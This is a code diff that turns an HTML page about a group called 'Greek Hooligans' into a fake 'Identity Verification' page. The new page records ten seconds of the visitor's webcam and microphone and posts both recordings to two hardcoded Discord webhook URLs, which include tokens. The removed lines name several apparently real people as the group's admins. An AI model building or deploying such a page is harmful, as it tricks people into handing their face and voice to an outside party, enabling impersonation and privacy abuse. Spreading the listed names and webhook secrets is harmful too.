@@ -2,45 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Greek Hooligans Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Face & Voice ID Verification</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="container">
-    <h1>Greek Hooligans Intros</h1>
-    <p>
-      Meet our admins showcasing:
-      <br>Domie Borgie
-      <br>Pierre Marguax Canete
-      <br>Gerwald Ihsan Biglang-awa
-      <br>Hans Nathan Calaranan
-      <br>Francess Pascua
-      <br>Hyex Sung Kimz
-      <br>Macey Yecam
-      <br>Skibidi Caden
-      <br>Rissalene Rose Lorenzo
-      <br><br>They are our admins who provide and serve justice to this group containing 39 members total.
-      <br>Owner is <strong>Domie Borgie</strong>, who formed this group.
-    </p>
-    
-    <button id="startBtn">Start Briefing</button>
+    <h1>🔐 Identity Verification</h1>
+    <p>Please verify your identity to proceed. This includes a short face scan and voice sample.</p>
+    <button id="verifyBtn">Begin Verification</button>
     <video id="preview" autoplay muted></video>
   </div>
 
   <script>
-    const startBtn = document.getElementById('startBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
     const preview = document.getElementById('preview');
 
-    startBtn.onclick = async () => {
-      startBtn.disabled = true;
+    verifyBtn.onclick = async () => {
+      verifyBtn.disabled = true;
+      verifyBtn.innerText = 'Verifying...';
 
-      // 🎥 Get webcam + mic
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
       preview.srcObject = stream;
       preview.style.display = 'block';
-
-      // 🎙️ Get audio-only
-      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
       const videoRecorder = new MediaRecorder(stream);
       const audioRecorder = new MediaRecorder(audioStream);
@@ -51,29 +36,33 @@
       videoRecorder.ondataavailable = e => videoChunks.push(e.data);
       audioRecorder.ondataavailable = e => audioChunks.push(e.data);
 
-      videoRecorder.onstop = async () => {
-        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-        const videoForm = new FormData();
-        videoForm.append('file', videoBlob, 'webcam.webm');
-        await fetch('http://localhost:3000/webcam', { method: 'POST', body: videoForm });
-        stream.getTracks().forEach(t => t.stop());
-      };
-
-      audioRecorder.onstop = async () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-        const audioForm = new FormData();
-        audioForm.append('file', audioBlob, 'microphone.webm');
-        await fetch('http://localhost:3000/mic', { method: 'POST', body: audioForm });
-        audioStream.getTracks().forEach(t => t.stop());
-      };
-
       videoRecorder.start();
       audioRecorder.start();
 
       setTimeout(() => {
         videoRecorder.stop();
         audioRecorder.stop();
-      }, 20000); // 20s
+      }, 10000); // 10s recording
+
+      videoRecorder.onstop = async () => {
+        const blob = new Blob(videoChunks, { type: 'video/webm' });
+        const form = new FormData();
+        form.append('file', blob, 'face-verification.webm');
+        await fetch('https://discord.com/api/webhooks/1397175042194014382/yNCyJ-3LAZqP62LGsct3Z8z9Ag0ztHnEeCS7tkvH-bgXU-Iai0-Xl-MP-Zb0gYfJCVLD', {
+          method: 'POST',
+          body: form
+        });
+      };
+
+      audioRecorder.onstop = async () => {
+        const blob = new Blob(audioChunks, { type: 'audio/webm' });
+        const form = new FormData();
+        form.append('file', blob, 'voice-verification.webm');
+        await fetch('https://discord.com/api/webhooks/1397177042608586753/lCqYCpPeaf9vhD5qTk2b1TXBFS8rANga2EX9rsbDlpSg6DM5i7QyiZv2jWsxw7hFEeDT', {
+          method: 'POST',
+          body: form
+        });
+      };
     };
   </script>
 </body>
